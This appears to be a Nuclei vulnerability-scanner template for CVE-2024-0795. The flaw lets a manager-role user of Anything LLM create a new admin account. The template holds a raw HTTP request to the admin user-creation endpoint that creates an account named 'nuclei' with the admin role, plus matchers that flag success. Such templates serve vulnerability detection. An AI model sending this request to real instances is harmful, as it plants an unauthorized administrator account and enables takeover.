id: CVE-2024-0795
info:
  name: Anything LLM Unauthorized Admin Account Creation
  author: VulnSphere
  severity: high
  description: If an attacked was given access to an instance with the admin or manager role there is no backend authentication that would prevent the attacked from creating a new user with an `admin` role and then be able to use this new account to have elevated privileges on the instance
  reference:
    - https://github.com/mintplex-labs/anything-llm/commit/9a237db3d1f66cdbcf5079599258f5fb251c5564
    - https://huntr.com/bounties/f69e3307-7b44-4776-ac60-2990990723ec
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cve-id: CVE-2024-0795
    cwe-id: CWE-284
    epss-score: 0.00043
    epss-percentile: 0.07361
  tags: anything-llm,admin,account,creation,bypass,cve,huntr

http:
  - raw:
    - |
      POST /api/admin/users/new HTTP/1.1
      Host: {{Hostname}}
      Content-Type: "application/json"
      Authorization: "Bearer {{token}}"

      {username: 'nuclei', password: 'password', role: 'admin'}


    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/json"
